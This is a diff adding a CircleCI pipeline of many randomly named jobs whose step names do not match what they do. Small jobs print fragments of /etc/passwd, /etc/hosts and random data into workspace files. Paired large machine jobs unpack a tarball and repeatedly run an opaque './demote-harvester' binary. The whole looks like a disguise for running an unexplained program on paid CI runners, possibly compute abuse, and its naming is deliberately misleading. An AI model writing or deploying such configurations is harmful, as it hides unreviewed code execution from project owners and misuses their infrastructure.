@@ -1,0 +1,1721 @@
+version: 2.1
+
+jobs:
+  DogVs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Initiate open for the settings gear
+          command: |
+            mkdir -p /tmp/pipeline/out
+            set +o pipefail 2>/dev/null; head -c 702202 /dev/urandom | xxd -p > /tmp/pipeline/out/Sprite; true
+            stat /tmp/pipeline/out/Sprite > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'Sprite'
+  go1-21-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/Sprite 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  normalFn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Soundcheck gc
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; echo 'not implemented yet' |od -c |head -2; true ; } > /tmp/pipeline/out/SIgmAcAchEaMBErloadEr
+            stat /tmp/pipeline/out/SIgmAcAchEaMBErloadEr > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'SIgmAcAchEaMBErloadEr'
+  luna-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/SIgmAcAchEaMBErloadEr 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  device_unlock_eager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Face off rotation
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; ls -l /usr/bin/*cat | awk '{print $3}' | sort -u; true ; } > /tmp/pipeline/out/228.164.2
+            stat /tmp/pipeline/out/228.164.2 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '228.164.2'
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/228.164.2 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  ULT-32139b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: try number two
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | tr -s ' ' | fmt -w 52 | wc -l; true ; } > /tmp/pipeline/out/Z5Oemv2IkPYTmPgsygavE
+            stat /tmp/pipeline/out/Z5Oemv2IkPYTmPgsygavE > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'Z5Oemv2IkPYTmPgsygavE'
+  q4-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  fk_shim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Promote Onboarding Guide
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; tar -czf "/tmp/temp.tgz" -C /etc hosts && tar -xzOf "/tmp/temp.tgz" hosts | head -n 3; true ; } > /tmp/pipeline/out/DSC58180
+            stat /tmp/pipeline/out/DSC58180 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'DSC58180'
+  sep15-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/DSC58180 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  succesful:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: r422 lint warning replay
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; ls -d /usr/bin/z* | xargs -n1 basename | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/pipeline/out/cfg.bin.sw
+            stat /tmp/pipeline/out/cfg.bin.sw > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'cfg.bin.sw'
+  nebula-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/cfg.bin.sw 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  token-payment-lever-post:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: not sure why we cut the status page
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; seq 9 5 20 | head -n 5 | xargs; true ; } > /tmp/pipeline/out/GPU-2e436_0fed5_GPU
+            stat /tmp/pipeline/out/GPU-2e436_0fed5_GPU > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'GPU-2e436_0fed5_GPU'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/GPU-2e436_0fed5_GPU 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  isBottom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Ingrid does the swap
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; \ls -diFc /usr/bin/?? |nl; true ; } > /tmp/pipeline/out/PANO00016137
+            stat /tmp/pipeline/out/PANO00016137 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'PANO00016137'
+  q1-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/PANO00016137 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  bamboo-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Article VII resume warmup steps
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 3 -type f -uid 0 2>/dev/null | tail -n 10; true ; } > /tmp/pipeline/out/LOT_024105
+            stat /tmp/pipeline/out/LOT_024105 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'LOT_024105'
+  delta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/LOT_024105 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  url34s:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: As admin backfill the sensor readings
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -newer /etc/passwd -exec ls -ld {} \; 2>/dev/null | nl; true ; } > /tmp/pipeline/out/crimson882
+            stat /tmp/pipeline/out/crimson882 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'crimson882'
+  dan-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  bitId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: dr site promotion gate
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; for x in $(seq 4); do echo "${x} squared is $((x**2))"; done | nl; true ; } > /tmp/pipeline/out/archive-6610
+            stat /tmp/pipeline/out/archive-6610 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'archive-6610'
+  d-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  should_bind:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Send the schema from prod to memory
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; ps -fp $$ | head -n 6; true ; } > /tmp/pipeline/out/173.242
+            stat /tmp/pipeline/out/173.242 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '173.242'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  SinglePosTrait:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Route the fume hood through Oslo
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'lorem ipsum' | od -An -tx1; true ; } > /tmp/pipeline/out/cd_cfg
+            stat /tmp/pipeline/out/cd_cfg > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'cd_cfg'
+  update-retry-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/cd_cfg 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  da-cd-93-e2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Cover art is waiting
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; find /etc -type l -exec ls -ld '{}' \; 2>/dev/null | sort | head -n 4; true ; } > /tmp/pipeline/out/draft_5f2c953
+            stat /tmp/pipeline/out/draft_5f2c953 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'draft_5f2c953'
+  nightly-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  drZhang:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Conduct demux against the poster image
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; thing=1; while [[ $thing -le 6 ]]; do printf '%d ' $((thing*thing)); let thing++; done; echo; true ; } > /tmp/pipeline/out/weSthosTAgeNTQUEuE
+            stat /tmp/pipeline/out/weSthosTAgeNTQUEuE > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'weSthosTAgeNTQUEuE'
+  wip-session-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/weSthosTAgeNTQUEuE 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  unionPeekCallback:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Pull sha 75f8a5
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; cat /etc/profile|grep --ignore-case export|nl; true ; } > /tmp/pipeline/out/moltenSilverNode
+            stat /tmp/pipeline/out/moltenSilverNode > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'moltenSilverNode'
+  Build_Staging5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/moltenSilverNode 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  nLogins:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: A small reminder
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; cut -d':' -f6 /etc/passwd | sed 's|.*/||' | pr -4 -t -w 80; true ; } > /tmp/pipeline/out/7de6f8f
+            stat /tmp/pipeline/out/7de6f8f > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '7de6f8f'
+  v6-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/7de6f8f 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  acheive:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: done recording junit output
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/issues2.gz" && zcat "/tmp/issues2.gz" | head -n 3; true ; } > /tmp/pipeline/out/blake_0ad133f647c2
+            stat /tmp/pipeline/out/blake_0ad133f647c2 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'blake_0ad133f647c2'
+  charlie-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/blake_0ad133f647c2 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  BUCKET_NBF:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Second attempt revoke the ID badges
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; echo -n "nothing to do" | sha224sum; true ; } > /tmp/pipeline/out/67b1bXSzS3mLt2Wi8ykp
+            stat /tmp/pipeline/out/67b1bXSzS3mLt2Wi8ykp > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '67b1bXSzS3mLt2Wi8ykp'
+  INFRA-334:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/67b1bXSzS3mLt2Wi8ykp 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  monkCam:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Seal the standard curve at 1000 rpm
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; shopt | head -n5; true ; } > /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e
+            stat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'b81c34a88ec2237f5ebc560961c74adf6661d7e'
+  qi-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  Close-PacketId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Brief Priya on capture
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; echo -n 'yay!' | od -An -tx1; true ; } > /tmp/pipeline/out/c
+            stat /tmp/pipeline/out/c > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'c'
+  fx-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  rd_nd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: MaskGoldTableStep
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; find /sys/class/net -size 0 -user $(whoami) | xargs -r ls -ld | head -5; true ; } > /tmp/pipeline/out/md5_dd9930a
+            stat /tmp/pipeline/out/md5_dd9930a > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'md5_dd9930a'
+  nov28-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
